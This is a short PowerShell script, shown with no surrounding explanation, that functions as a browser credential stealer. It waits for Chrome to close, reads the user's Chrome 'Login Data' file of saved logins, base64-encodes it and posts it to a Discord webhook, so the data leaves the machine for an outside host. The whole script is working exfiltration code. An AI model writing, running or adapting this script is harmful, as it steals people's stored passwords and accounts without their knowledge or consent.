$filePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"

function Wait-ForChromeToClose {
    while (Get-Process -Name chrome -ErrorAction SilentlyContinue) {
        Write-Host "Waiting for Chrome to close..."
        Start-Sleep -Seconds 3
    }
    Write-Host "Chrome is closed, proceeding..."
}

Wait-ForChromeToClose

if (-Not (Test-Path $filePath)) {
    Write-Host "File not found: $filePath"
    exit
}

$maxRetries = 5
$retryCount = 0
$fileBytes = $null

while (-not $fileBytes -and $retryCount -lt $maxRetries) {
    try {
        Write-Host "Attempt $($retryCount + 1) to read the file..."
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    }
    catch {
        Write-Host "File locked or inaccessible, retrying in 2 seconds..."
        Start-Sleep -Seconds 2
        $retryCount++
    }
}

if (-not $fileBytes) {
    Write-Host "Failed to read file after $maxRetries attempts. Exiting."
    exit
}

$fileBase64 = [Convert]::ToBase64String($fileBytes)

$webhookUrl = "https://discord.com/api/webhooks/1374075895941169322/0q_M5862QHhmUHeIUIu9b0Y_L2feBqu-tbTz3gsbEiASX5HtOc8gwfh5fNMajSnbCrOq"

$payload = @{
    content = "Base64 preview of Login Data:`n$fileBase64"
} | ConvertTo-Json -Depth 3

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'

Write-Host "Base64 preview sent to Discord webhook."
